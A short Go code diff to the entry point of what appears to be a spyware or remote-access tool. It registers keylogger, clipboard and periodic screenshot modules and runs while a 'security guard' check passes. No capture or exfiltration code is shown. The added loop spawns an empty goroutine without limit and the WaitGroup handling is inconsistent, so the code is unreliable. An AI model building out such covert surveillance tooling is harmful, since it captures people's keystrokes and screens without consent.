@@ -9,6 +9,7 @@ import (
 
 func main() {
 	var wg sync.WaitGroup
+	wg.Add(1) // for run app
 
 	db.Init()
 
@@ -24,16 +25,18 @@ func main() {
 		log.Fatalf("failed to cast security_guard app to SecurityGuardApp")
 	}
 	for securityGuard.IsSafeToRun() {
-		// communicate and run requests
+		go run()
 	}
-
 	appManager.StopAll()
-	wg.Wait()
 }
 
 func addBuiltinApps(am *apps.AppManager) {
 	am.AddApp("clipboard", &apps.ClipboardApp{})
 	am.AddApp("keylogger", &apps.KeyLoggerApp{})
 	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2000})
-	am.AddApp("security_guard", &apps.SecurityGuardApp{})
+	securityGuard := &apps.SecurityGuardApp{}
+	securityGuard.Validate()
+	am.AddApp("security_guard", securityGuard)
 }
+
+func run() {}
